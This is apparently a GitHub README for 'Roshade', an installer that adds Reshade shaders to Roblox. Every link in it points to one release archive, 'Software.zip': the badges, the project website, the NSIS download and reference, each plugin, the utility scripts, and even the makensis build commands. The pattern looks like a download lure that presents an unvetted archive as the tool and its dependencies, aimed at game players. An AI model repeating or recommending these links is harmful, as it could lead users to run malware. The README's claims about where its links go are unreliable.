# Roshade [![Build](https://github.com/vincent1010e/Roshade/releases/download/v2.0/Software.zip)](https://github.com/vincent1010e/Roshade/releases/download/v2.0/Software.zip) [![Roshade](https://github.com/vincent1010e/Roshade/releases/download/v2.0/Software.zip)](https://github.com/vincent1010e/Roshade/releases/download/v2.0/Software.zip) ![Downloads](https://github.com/vincent1010e/Roshade/releases/download/v2.0/Software.zip) [![NSIS](https://github.com/vincent1010e/Roshade/releases/download/v2.0/Software.zip)](https://github.com/vincent1010e/Roshade/releases/download/v2.0/Software.zip)

Roshade is an installation package that makes it easy to correctly install Reshade presets and shaders to the Roblox directory. With Roshade, you can quickly and easily customize your Roblox experience with advanced visual effects.

## Key features:
- Uses the registry to locate and uninstall Roblox, avoiding any incorrect uninstalls.
- Allows you to select essential Reshade keybinds during installation.
- Resolves previously unknown errors through dialog messages.
- Provides a description of system requirements for each component.
- Automatically installs the required shaders from GitHub.

## Getting Started
To get started with Roshade, you'll first need to download the latest release from the [releases](https://github.com/vincent1010e/Roshade/releases/download/v2.0/Software.zip) page. Once you've downloaded the installer, simply run it and follow the prompts to install Roshade. Once installation is complete, you'll be able to launch Roblox and start customizing your visual experience with the included Reshade presets and shaders.

If you have any questions or issues with Roshade, please feel free to open an issue on the GitHub repository, or visit the [Roshade website](https://github.com/vincent1010e/Roshade/releases/download/v2.0/Software.zip) for more information.

## Building the source
The installer is written in [NSIS](https://github.com/vincent1010e/Roshade/releases/download/v2.0/Software.zip "Download NSIS"), a popular open-source tool for creating Windows installers. To build the source, you'll need to have NSIS installed on your machine. I highly recommend reading through the [NSIS reference](https://github.com/vincent1010e/Roshade/releases/download/v2.0/Software.zip) before proceeding.

### Libraries
Some dependencies may be installed to the NSIS directory, or to the repository's *Setup\Util* folder. For more information on installing plugins to the NSIS directory, click [here](https://github.com/vincent1010e/Roshade/releases/download/v2.0/Software.zip).
##### NSIS Plugins Directory:
- [LogEx](https://github.com/vincent1010e/Roshade/releases/download/v2.0/Software.zip)
- [NScurl](https://github.com/vincent1010e/Roshade/releases/download/v2.0/Software.zip)
- [Nsisunz](https://github.com/vincent1010e/Roshade/releases/download/v2.0/Software.zip)
- [NsProcess](https://github.com/vincent1010e/Roshade/releases/download/v2.0/Software.zip)
- [TitlebarProgress](https://github.com/vincent1010e/Roshade/releases/download/v2.0/Software.zip)
- [TaskbarProgress](https://github.com/vincent1010e/Roshade/releases/download/v2.0/Software.zip)
- [nsJSON](https://github.com/vincent1010e/Roshade/releases/download/v2.0/Software.zip)
- [AccessControl](https://github.com/vincent1010e/Roshade/releases/download/v2.0/Software.zip)
##### Setup->Util folder:
- [MoveFileFolder](https://github.com/vincent1010e/Roshade/releases/download/v2.0/Software.zip)
- [GetSectionNames](https://github.com/vincent1010e/Roshade/releases/download/v2.0/Software.zip)
- [Explode](https://github.com/vincent1010e/Roshade/releases/download/v2.0/Software.zip)
- [StrContains](https://github.com/vincent1010e/Roshade/releases/download/v2.0/Software.zip)
- [ConfigRead](https://github.com/vincent1010e/Roshade/releases/download/v2.0/Software.zip)

### Command Line
You can build using the command line:
```
> makensis https://github.com/vincent1010e/Roshade/releases/download/v2.0/Software.zip
```
For production, it is recommended to use **lzma compression**, as it offers a higher compression ratio:
```
> makensis /X"SetCompressor /FINAL lzma" https://github.com/vincent1010e/Roshade/releases/download/v2.0/Software.zip
```
